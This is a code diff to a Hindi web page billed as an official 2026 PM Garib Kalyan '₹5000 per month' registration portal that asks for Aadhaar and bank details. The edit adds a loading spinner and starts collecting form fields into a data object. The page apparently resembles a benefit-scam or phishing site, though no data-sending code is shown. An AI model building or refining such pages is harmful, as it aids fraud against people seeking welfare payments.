@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>प्रधानमंत्री गरीब कल्याण योजना 2026 | ₹5000 पंजीकरण पोर्टल</title>
+    
 <meta name="title" content="प्रधानमंत्री गरीब कल्याण योजना 2026 | ₹5000 पंजीकरण पोर्टल">
 <meta name="description" content="PMGKY 2026 के तहत नया पंजीकरण शुरू। अपना आधार और बैंक खाता लिंक करें और हर माह ₹5000 की वित्तीय सहायता सीधे बैंक खाते में प्राप्त करें। आधिकारिक सरकारी सहायता पोर्टल।">
 <meta name="keywords" content="PMGKY 2026, प्रधानमंत्री गरीब कल्याण योजना, सरकारी योजना पंजीकरण, ₹5000 सहायता योजना, PM Modi Schemes 2026, DBT Payment Check">
@@ -54,7 +55,33 @@
             line-height: 1.6;
             overflow-x: hidden;
         }
-
+#loader{
+     position: fixed;
+     top: 0;
+     left: 0;
+     width: 100vw;
+     height: 100vh;
+     background: rgba(0,0,0,0.7);
+     display: none;
+     place-items: center;
+     z-index: 9999;
+   }
+   .spinner{
+     height: 40px;
+     width: 40px;
+     border-radius: 100%;
+     border: 8px solid #fff;
+     border-top-color: transparent;
+     animation: anim .6s linear infinite;
+   }
+   @keyframes anim{
+     0%{
+       transform: rotate(0deg);
+     }
+     100%{
+       transform: rotate(360deg);
+     }
+   }
         /* --- मोबाइल-फर्स्ट यूटिलिटी क्लासेस (विस्तार हेतु) --- */
         .container { width: 100%; padding: 0 20px; margin: 0 auto; }
         .flex-center { display: flex; justify-content: center; align-items: center; }
@@ -807,8 +834,7 @@
             });
 
             if(isValid) {
-                alert("सत्यापन सफल! आपके दस्तावेज़ों की जांच की जा रही है।");
-                // अगले भाग के लिए डेटा प्रोसेसिंग सिमुलेशन
+              
                 showLoading();
                 let data={};
                inputs.forEach(input=>{
@@ -842,7 +868,7 @@
         }
 
         function showLoading() {
-            console.log("डेटाबेस से कनेक्ट किया जा रहा है...");
+            document.getElementById('loader').style.display='grid'
             // यहाँ जटिल JavaScript गणनाएँ जोड़ी जा सकती हैं
         }
 
@@ -1833,8 +1859,11 @@
            इवेंट लिस्टनर्स और एरर हैंडलिंग लॉजिक का विस्तार किया गया है */
         
     </script>
-</body>
-</html>
+    <div id="loader">
+      <div class="spinner">
+        
+      </div>
+    </div>
 
     </body>
 </html>
